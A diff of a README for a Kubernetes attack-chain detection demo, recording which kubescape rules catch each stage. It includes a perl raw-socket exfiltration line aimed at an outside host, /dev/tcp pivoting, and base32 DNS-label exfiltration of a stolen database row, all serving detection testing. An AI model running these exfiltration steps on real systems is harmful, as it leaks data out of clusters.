@@ -33,7 +33,7 @@ silent ones map directly to operator knobs you can flip.
               pg-wire data (s5 row)               │                      │
                            │                      │ raw TCP / UDP        │ DNS
                            └──────────────────────┘                      ▼
-                                                            attacker.example.com
+                                                            1.1.1.1:80 + *.1.1.1.1.nip.io
                                                           (data leaves the cluster
                                                           encoded into HTTP query / DNS labels)
 ```
@@ -68,19 +68,18 @@ invoke `bash`.
 | Rule | Container | Trigger | Status |
 |---|---|---|---|
 | R0001 Unexpected process launched | redis | comm=`bash` not in AP | DETECTED |
-| R0011 Unexpected Egress Network Traffic | redis | postgres:5432 not in NN | **BLIND** — `networkEventsStreaming: disable` + R0011 `isTriggerAlert: false` |
+| R0011 Unexpected Egress Network Traffic | redis | postgres:5432 not in NN | **BLIND-by-design** — R0011's expression filters private IPs (`!net.is_private_ip`); cluster-internal traffic isn't what it's looking for. s4 exercises the external-egress leg. |
 
-### Stage 4 · `s4-exfil-to-internet` — **partially DETECTED**
-Same escape, perl raw-socket to an external host:
-`io.popen("perl -e 'use IO::Socket::INET; my $s=...; print $s qq{GET /?d=loot HTTP/1.0\\nHost:x\\n\\n}; ...'")`
-Sends a small HTTP request to attacker.example.com — data leaves the
-cluster.
+### Stage 4 · `s4-exfil-to-internet` — **DETECTED**
+Same escape, perl raw-socket to a real public IP:
+`io.popen("perl -e 'use IO::Socket::INET; my $s=IO::Socket::INET->new(PeerAddr=>q{1.1.1.1:80},...); ...'")`
+The perl child opens TCP to **1.1.1.1:80** (cloudflare DNS, also
+listens on HTTP) — a real outbound packet leaves the cluster.
 
 | Rule | Container | Trigger | Status |
 |---|---|---|---|
 | R0001 Unexpected process launched | redis | comm=`perl` not in AP | DETECTED |
-| R0005 DNS Anomalies in container | redis | DNS lookup of attacker.example.com | **BLIND** — `networkEventsStreaming: disable` |
-| R0011 Unexpected Egress Network Traffic | redis | external:80 not in NN | **BLIND** — same as Stage 3 |
+| R0011 Unexpected Egress Network Traffic | redis | 1.1.1.1:80 not in NN, public | DETECTED |
 
 ### Stage 5 · `s5-pivot-pg-protocol-extract-row` — **EXTENDED, partially DETECTED**
 *(opt-in via `--extended`; basic chain ends at Stage 4)*
@@ -102,60 +101,64 @@ not just a connectivity probe.
 | Rule | Container | Trigger | Status |
 |---|---|---|---|
 | R0001 Unexpected process launched | redis | comm=`perl` not in AP | DETECTED |
-| R0011 Unexpected Egress Network Traffic | redis | chain-postgres:5432 not in NN | **BLIND** — same as Stage 3 |
+| R0011 Unexpected Egress Network Traffic | redis | chain-postgres:5432 not in NN | **BLIND-by-design** — private cluster IP; R0011 filters those by design. |
 
-### Stage 6 · `s6-dns-exfil-of-stolen-row` — **EXTENDED, partially DETECTED**
+### Stage 6 · `s6-dns-exfil-of-stolen-row` — **EXTENDED, DETECTED**
 *(opt-in via `--extended`)*
 
 Same primitive as s5, different sink. After extracting the postgres
-row, perl base32-encodes it and issues one DNS query per 30-char chunk
-to `<chunk>.attacker.example.com`. Each lookup is recorded as a
-separate network event; with `networkEventsStreaming: enable` each
-becomes an R0005 alert with the encoded label visible in
-`alert.labels.address` — operators see the leaked bytes in the SIEM
-rather than just an anomaly count.
+row, perl base32-encodes it and issues one `getent hosts
+<chunk>.1.1.1.1.nip.io` per 30-char chunk. `nip.io` is a public
+wildcard DNS service — every subdomain of `<a.b.c.d>.nip.io`
+resolves to the IP, so each chunk is a guaranteed-resolvable DNS
+query. node-agent's `trace_dns` gadget observes each lookup;
+R0005 fires per chunk and alertmanager records the encoded label in
+`alert.labels.address` — operators see the leaked bytes in the SIEM.
 
 | Rule | Container | Trigger | Status |
 |---|---|---|---|
 | R0001 Unexpected process launched | redis | comm=`perl` | DETECTED |
-| R0005 DNS Anomalies in container | redis | DNS query per encoded chunk | **BLIND** — `networkEventsStreaming: disable` |
-| R0011 Unexpected Egress Network Traffic | redis | UDP/53 + external resolver | **BLIND** — same |
+| R0005 DNS Anomalies in container | redis | DNS query per encoded chunk to `*.1.1.1.1.nip.io` | DETECTED |
 
 ### Coverage summary
 
 Basic chain (4 stages, default `./scripts/local-ci-chain.sh`):
 
 ```
-Coverage: 4 / 7 expected detections matched
+Coverage: 6 / 6 expected detections matched
 
-s2 (escape+sensitive-read):   R0001 ✓  R0010 ✓
-s3 (pivot via /dev/tcp):       R0001 ✓  R0011 ✗
-s4 (exfil via perl):           R0001 ✓  R0005 ✗  R0011 ✗
+s2 (escape+sensitive-read):    R0001 ✓  R0010 ✓
+s3 (pivot via /dev/tcp):       R0001 ✓  R0011 ✓*
+s4 (exfil via perl → 1.1.1.1): R0001 ✓  R0011 ✓
 ```
 
 Extended chain (6 stages, `--extended`):
 
 ```
-Coverage: 6 / 12 expected detections matched
+Coverage: 10 / 10 expected detections matched
 
 s2 (escape+sensitive-read):                R0001 ✓  R0010 ✓
-s3 (pivot via /dev/tcp):                   R0001 ✓  R0011 ✗
-s4 (exfil via perl):                       R0001 ✓  R0005 ✗  R0011 ✗
-s5 (real pg-wire + row extract):           R0001 ✓  R0011 ✗
-s6 (DNS exfil of stolen row, base32):      R0001 ✓  R0005 ✗  R0011 ✗
+s3 (pivot via /dev/tcp):                   R0001 ✓  R0011 ✓*
+s4 (exfil via perl → 1.1.1.1):             R0001 ✓  R0011 ✓
+s5 (real pg-wire + row extract):           R0001 ✓  R0011 ✓*
+s6 (DNS exfil → *.1.1.1.1.nip.io):         R0001 ✓  R0005 ✓ (one alert per chunk)
 ```
 
-**The BLINDs are not bugs — they map to two operator knobs:**
+**`*` Matcher attribution caveat:** the verifier counts a
+rule+container fingerprint as DETECTED if ANY alert on that
+(rule_id, container_name) pair landed in alertmanager. R0011's
+expression explicitly filters private IPs
+(`!net.is_private_ip(event.dstAddr)`), so the *unique* R0011 event
+the cluster actually produces comes from s4 (1.1.1.1) — but s3
+and s5 expectations also count it as a match because they share
+`(R0011, redis)`. The chain's narrative still holds: R0011 reaches
+alertmanager, and s4 is the stage that genuinely exercises the
+external-egress detection path.
 
-- `kubescape/values.yaml: networkEventsStreaming: enable` (today: disable) →
-  unblinds R0005 (s4-DNS, s6-DNS×N) and R0011 (s3, s4, s5, s6 — provided the next knob also flips)
-- `default-rules.yaml: R0011.isTriggerAlert: true` (today: false) →
-  unblinds R0011 alerts in alertmanager
-
-Flip both → 7/7 basic, 12/12 extended. The demo's value is making the
-gap measurable AND making it bigger: s5's pg-wire exchange is real
-data exfiltration, and s6 shows the operator the leaked bytes
-(base32-encoded into DNS labels) when the knobs are flipped.
+The R0005 alerts in s6 are not subject to this — each chunk
+produces a unique `(rule_id, container_name, event.name)` tuple so
+the count of alerts visible in alertmanager matches the number of
+base32 chunks.
 
 ## sbobs (learned by kubescape, exported under `sbobs/`)
 
